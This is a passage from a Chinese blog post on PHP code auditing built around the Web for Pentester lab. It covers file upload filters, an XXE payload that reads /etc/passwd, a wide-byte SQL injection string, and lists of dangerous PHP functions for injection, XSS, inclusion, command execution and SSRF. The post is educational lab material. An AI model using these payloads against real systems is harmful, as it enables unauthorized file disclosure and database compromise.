class="string">'tmp_name'</span>], $dir . $file))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Upload done !'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your file can be found &lt;a href="/upload/images/'</span>.htmlentities($file).<span class="string">'"&gt;here&lt;/a&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">  &#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'Upload failed'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码多了一个正则表达式，匹配文件后缀名是不是<code>.php</code>，但是大小写不敏感。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/34.png" alt="34"></p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/35.png" alt="35"></p>
<h2 id="0x08-XML-attacks"><a href="#0x08-XML-attacks" class="headerlink" title="0x08 XML attacks"></a>0x08 XML attacks</h2><h3 id="example1-7"><a href="#example1-7" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</span><br><span class="line">  print_r((string)$xml);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码很简单，get方式通过xml参数传入数据，然后由<code>simplexml_load_string()</code>解析执行。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</span><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="第二章-总结"><a href="#第二章-总结" class="headerlink" title="第二章 总结"></a>第二章 总结</h1><p>上面是针对web_for_pentester漏洞的代码展现，以及一些我的理解。然后现在针对php下一些通用型漏洞的代码审计敏感函数做个总结。</p>
<h2 id="0x01-注入"><a href="#0x01-注入" class="headerlink" title="0x01 注入"></a>0x01 注入</h2><p>sql注入的原因前面也讲过了，当时归根到底，其实是因为sql语句拼接导致的。</p>
<h3 id="1-普通注入"><a href="#1-普通注入" class="headerlink" title="1. 普通注入"></a>1. 普通注入</h3><p>常见的sql注入有int型和字符型，在字符型注入中需要使用单或双引号闭合，代码审计的时候关注函数例如<code>select form</code>、<code>mysql_connect</code>、<code>mysql_query</code>、<code>mysql_fetch_row</code>等，以及一些数据的执行操作，例如<code>update</code>、<code>insert</code>、<code>delete</code>。</p>
<h3 id="2-宽字节注入"><a href="#2-宽字节注入" class="headerlink" title="2. 宽字节注入"></a>2. 宽字节注入</h3><p>宽字节注入的原因主要是因为当设置<code>set character_set_client=gbk</code>时候会导致一个编码转换的注入的问题。设置完这个之后，服务器接受请求，例如接收到<code>/test.php?id=-1%df&#39; and 1=1%23</code>，mysql对应的运行语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id =&apos;1運&apos; and 1=1#&apos;</span><br></pre></td></tr></table></figure>
<p>这里是由于单引号被自动转义成<code>\</code>，然后前面的<code>%df</code>和转义符号<code>\</code>（%5c）组成了<code>%df%5c</code>，也就是<code>運</code>字，所以成功闭合了。但是一般的设置办法是<code>SET NAMES &#39;gbk&#39;</code>，但是其实这个东西等同于如下的sql语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET</span><br><span class="line">character_set_connection=&apos;gbk&apos;,</span><br><span class="line">character_set_result=&apos;gbk&apos;,</span><br><span class="line">character_set_client=gbk</span><br></pre></td></tr></table></figure>
<p>这同样存在宽字节注入的问题，另外官方推荐使用mysql_set_charset方式来设置编码，但是这个方式也是调用<code>SET NAMES</code>。</p>
<h3 id="3-二次注入"><a href="#3-二次注入" class="headerlink" title="3. 二次注入"></a>3. 二次注入</h3><p>PHP的web程序大多数情况下会对参数进行过滤，通常使用<code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string()</code>函数或者开启GPC的方法来放注入，也就是给<code>&#39;</code>、<code>&quot;</code>、<code>\</code>、<code>NULL</code>加上反斜杠转义。所以如果某处使用了urldecode或者rawurldecode函数，则会导致二次解码，绕过过滤以及GPC。</p>
<h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02 XSS"></a>0x02 XSS</h2><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数，常用的输出函数列表如下：print、print_r、echo、printf、sprintf、die、var_dump、var_export。所以找寻这些输出函数，并且查看是否有做XSS过滤。</p>
<h2 id="0x03-文件包含"><a href="#0x03-文件包含" class="headerlink" title="0x03 文件包含"></a>0x03 文件包含</h2><p>PHP可能出现文件包含的函数：include、include_once、require、require_once、show_source、highlight_file、readfile、file_get_contents、fopen。关注点是否可以输入变量，且变量可控。</p>
<h2 id="0x04-命令注入"><a href="#0x04-命令注入" class="headerlink" title="0x04 命令注入"></a>0x04 命令注入</h2><p>PHP执行系统命令可以使用以下几个函数：system、exec、passthru、“、shell_exec、popen、proc_open、pcntl_exec <br>我们通过在全部程序文件中搜索这些函数，确定函数的参数是否会因为外部提交而改变，检查这些参数是否有经过安全处理。 </p>
<h2 id="0x05-代码注入"><a href="#0x05-代码注入" class="headerlink" title="0x05 代码注入"></a>0x05 代码注入</h2><p>PHP可能出现代码注入的函数：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function<br>查找程序中程序中使用这些函数的地方，检查提交变量是否用户可控，有无做输入验证  </p>
<h2 id="0x06-文件管理类（任意文件写入、删除等）"><a href="#0x06-文件管理类（任意文件写入、删除等）" class="headerlink" title="0x06 文件管理类（任意文件写入、删除等）"></a>0x06 文件管理类（任意文件写入、删除等）</h2><p>PHP的用于文件管理的函数，如果输入变量可由用户提交，程序中也没有做数据验证，可能成为高危漏洞。我们应该在程序中搜索如下函数：copy、rmdir、unlink、delete、fwrite、chmod、fgetc、fgetcsv、fgets、fgetss、file、file_get_contents、fread、readfile、ftruncate、file_put_contents、fputcsv、fputs，但通常PHP中每一个文件操作函数都可能是危险的。  </p>
<h2 id="0x07-文件上传"><a href="#0x07-文件上传" class="headerlink" title="0x07 文件上传"></a>0x07 文件上传</h2><p>PHP文件上传通常会使用move_uploaded_file，也可以找到文件上传的程序进行具体分析，查看是怎么样过滤的，例如：白名单、黑名单、软waf等。</p>
<h2 id="0x08-XML注入"><a href="#0x08-XML注入" class="headerlink" title="0x08 XML注入"></a>0x08 XML注入</h2><p>PHP下<code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞。可以关注下是否禁用了外部实体注入。</p>
<h2 id="0x09-SSRF"><a href="#0x09-SSRF" class="headerlink" title="0x09 SSRF"></a>0x09 SSRF</h2><p>PHP下<code>cURL</code>、<code>file_get_contents</code>、<code>get_headers</code>、<code>fsockopen</code>均可能导致ssrf漏洞，审计的时候关注是否存在内网ip以及一些协议的过滤。</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
          
            <a href="/tags/漏洞学习/" rel="tag"><i class="fa fa-tag"></i> 漏洞学习</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/05/11/蜜罐学习/" rel="next" title="蜜罐学习">
                <i class="fa fa-chevron-left"></i> 蜜罐学习
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/05/23/php代码审计专题-1/" rel="prev" title="php代码审计专题(1)">
                php代码审计专题(1) <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="l1nk3r" />
            
              <p class="site-author-name" itemprop="name">l1nk3r</p>
              <p class="site-description motion-element" itemprop="description">愿你出走半生，归来仍是少年</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">21</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sukaralin" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:sukaralin@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://weibo.com/SukaraLin" target="_blank" title="Weibo">
                      
                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一章-练习关卡"><span class="nav-text">第一章 练习关卡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-xss"><span class="nav-text">0x01 xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2"><span class="nav-text">example2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example3"><span class="nav-text">example3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example4"><span class="nav-text">example4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example5"><span class="nav-text">example5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example6"><span class="nav-text">example6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example7"><span class="nav-text">example7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example8"><span class="nav-text">example8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example9"><span class="nav-text">example9</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL注入"><span class="nav-text">0x02 SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-1"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-1"><span class="nav-text">example2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example3-1"><span class="nav-text">example3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example4-1"><span class="nav-text">example4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example5-1"><span class="nav-text">example5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example6-1"><span class="nav-text">example6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example7-1"><span class="nav-text">example7</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Directory-traversal"><span class="nav-text">0x03 Directory traversal</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-2"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-2"><span class="nav-text">example2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example3-2"><span class="nav-text">example3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-File-Include"><span class="nav-text">0x04 File Include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-3"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-3"><span class="nav-text">example2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Code-injection"><span class="nav-text">0x05 Code injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-4"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-4"><span class="nav-text">example2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-知识介绍"><span class="nav-text">1. 知识介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-如何利用create-function-）代码注入"><span class="nav-text">2. 如何利用create_function(）代码注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example3-3"><span class="nav-text">example3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example4-2"><span class="nav-text">example4</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Commands-injection"><span class="nav-text">0x06 Commands injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-5"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-5"><span class="nav-text">example2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example3-4"><span class="nav-text">example3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-File-Upload"><span class="nav-text">0x07 File Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-6"><span class="nav-text">example1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#example2-6"><span class="nav-text">example2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-XML-attacks"><span class="nav-text">0x08 XML attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#example1-7"><span class="nav-text">example1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二章-总结"><span class="nav-text">第二章 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-注入"><span class="nav-text">0x01 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-普通注入"><span class="nav-text">1. 普通注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-宽字节注入"><span class="nav-text">2. 宽字节注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-二次注入"><span class="nav-text">3. 二次注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-XSS"><span class="nav-text">0x02 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-文件包含"><span class="nav-text">0x03 文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-命令注入"><span class="nav-text">0x04 命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-代码注入"><span class="nav-text">0x05 代码注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-文件管理类（任意文件写入、删除等）"><span class="nav-text">0x06 文件管理类（任意文件写入、删除等）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-文件上传"><span class="nav-text">0x07 文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-XML注入"><span class="nav-text">0x08 XML注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-SSRF"><span class="nav-text">0x09 SSRF</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">l1nk3r</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
    
      <!-- custom analytics part create by xiamo -->
<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
<script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
<script>
function showTime(Counter) {
	var query = new AV.Query(Counter);
	$(".leancloud_visitors").each(function() {
		var url = $(this).attr("id").trim();
		query.equalTo("url", url);
		query.find({
			success: function(results) {
				if (results.length == 0) {
					var content = '0 ' + $(document.getElementById(url)).text();
					$(document.getElementById(url)).text(content);
					return;
				}
				for (var i = 0; i < results.length; i++) {
					var object = results[i];
					var content = object.get('time') + ' ' + $(document.getElementById(url)).text();
					$(document.getElementById(url)).text(content);
				}
			},
			error: function(object, error) {
				console.log("Error: " + error.code + " " + error.message);
			}
		});

	});
}

function addCount(Counter) {
	var Counter = AV.Object.extend("Counter");
	url = $(".leancloud_visitors").attr('id').trim();
	title = $(".leancloud_visitors").attr('data-flag-title').trim();
	var query = new AV.Query(Counter);
	query.equalTo("url", url);
	query.find({
		success: function(results) {
			if (results.length > 0) {
				var counter = results[0];
				counter.fetchWhenSave(true);
				counter.increment("time");
				counter.save(null, {
					success: function(counter) {
						var content =  counter.get('time') + ' ' + $(document.getElementById(url)).text();
						$(document.getElementById(url)).text(content);
					},
					error: function(counter, error) {
						console.log('Failed to save Visitor num, with error message: ' + error.message);
					}
				});
			} else {
				var newcounter = new Counter();
				newcounter.set("title", title);
				newcounter.set("url", url);
				newcounter.set("time", 1);
				newcounter.save(null, {
					success: function(newcounter) {
					    console.log("newcounter.get('time')="+newcounter.get('time'));
						var content = newcounter.get('time') + ' ' + $(document.getElementById(url)).text();
						$(document.getElementById(url)).text(content);
					},
					error: function(newcounter, error) {
						console.log('Failed to create');
					}
				});
			}
		},
		error: function(error) {
			console.log('Error:' + error.code + " " + error.message);
		}
	});
}
$(function() {
	var Counter = AV.Object.extend("Counter");
	if ($('.leancloud_visitors').length == 1) {
		addCount(Counter);
	} else if ($('.post-title-link').length > 1) {
		showTime(Counter);
	}
}); 
</script>
    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("UK6XjHUbz1agzT32wU9TCYHNH-gzGzoHsz", "Qok6iqgiGgI7g4lDx8MdQVEu");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

  <!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
</body>
</html>
